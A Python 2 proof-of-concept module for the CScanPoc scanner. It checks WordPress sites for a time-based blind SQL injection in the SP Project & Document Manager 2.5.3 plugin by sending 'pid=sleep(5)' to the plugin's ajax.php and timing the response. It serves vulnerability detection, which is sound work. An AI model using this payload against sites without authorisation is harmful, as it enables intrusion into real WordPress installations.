# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'WordPress_0037' # 平台漏洞编号，留空
    name = 'WordPress SP Project & Document Manager SQL盲注' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-03-31'  # 漏洞公布时间
    desc = '''
       WordPress SP Project & Document Manager 2.5.3 插件 SQL盲注 
    ''' # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36576/' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress SP Project & Document Manager 2.5.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '335fdd96-57e5-42af-8fae-d7dfb840d9ea'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            ture_url='/wp-content/plugins/sp-client-document-manager/ajax.php?function=thumbnails&pid=1'
            start_time1=time.time()
            code1, head1, res1, errcode1, _ = hh.http(ture_url)
            true_time=time.time()-start_time1
                       
            flase_url='/wp-content/plugins/sp-client-document-manager/ajax.php?function=thumbnails&pid=sleep(5)'
            start_time2=time.time()
            code2, head2, res2, errcode2, _ = hh.http(flase_url)
            flase_time=time.time()-start_time2
            if code1==200 and code2==200 and flase_time>true_time and flase_time>5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()